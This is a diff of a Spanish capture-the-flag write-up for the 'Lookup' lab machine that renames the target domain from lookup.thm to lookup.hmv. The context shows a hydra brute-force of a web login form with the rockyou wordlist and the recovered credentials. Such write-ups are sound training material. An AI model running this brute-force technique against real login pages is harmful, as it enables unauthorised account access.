@@ -21,7 +21,7 @@ OS details: Linux 4.15
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Como podemos observar del escaneo, el puerto 80 nos está tratando de redireccionar a `http://lookup.thm`
+Como podemos observar del escaneo, el puerto 80 nos está tratando de redireccionar a `http://lookup.hmv`
 
 Si nosotros tratamos de ingresar a la página web solo a través de la IP, está nos arrojará un error, es por ello que debemos de hacer una configuración. Debemos de configurar la redirección de IP al nombre del dominio en el archivo `/etc/hosts`.
 
@@ -143,10 +143,10 @@ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.hmv http-post-form "/lo
 Luego de unos minutos obtenemos lo siguiente:
 
 ```bash
-[ATTEMPT] target lookup.thm - login "jose" - pass "ecuador" - 1416 of 14344399 [child 8] (0/0)
-[ATTEMPT] target lookup.thm - login "jose" - pass "hotpink" - 1417 of 14344399 [child 10] (0/0)
-[ATTEMPT] target lookup.thm - login "jose" - pass "soulmate" - 1418 of 14344399 [child 0] (0/0)
-[80][http-post-form] host: lookup.thm   login: jose   password: password123
+[ATTEMPT] target lookup.hmv - login "jose" - pass "ecuador" - 1416 of 14344399 [child 8] (0/0)
+[ATTEMPT] target lookup.hmv - login "jose" - pass "hotpink" - 1417 of 14344399 [child 10] (0/0)
+[ATTEMPT] target lookup.hmv - login "jose" - pass "soulmate" - 1418 of 14344399 [child 0] (0/0)
+[80][http-post-form] host: lookup.hmv   login: jose   password: password123
 ```
 
 Con esto ya nos podemos logear.
@@ -155,7 +155,7 @@ Sin embargo, cuando colocamos las credenciales obtenemos el siguiente mensaje:
 
 ```
 This site can’t be reached
-files.lookup.thm’s DNS address could not be found. Diagnosing the problem.
+files.lookup.hmv’s DNS address could not be found. Diagnosing the problem.
 DNS_PROBE_POSSIBLE
 ```
 
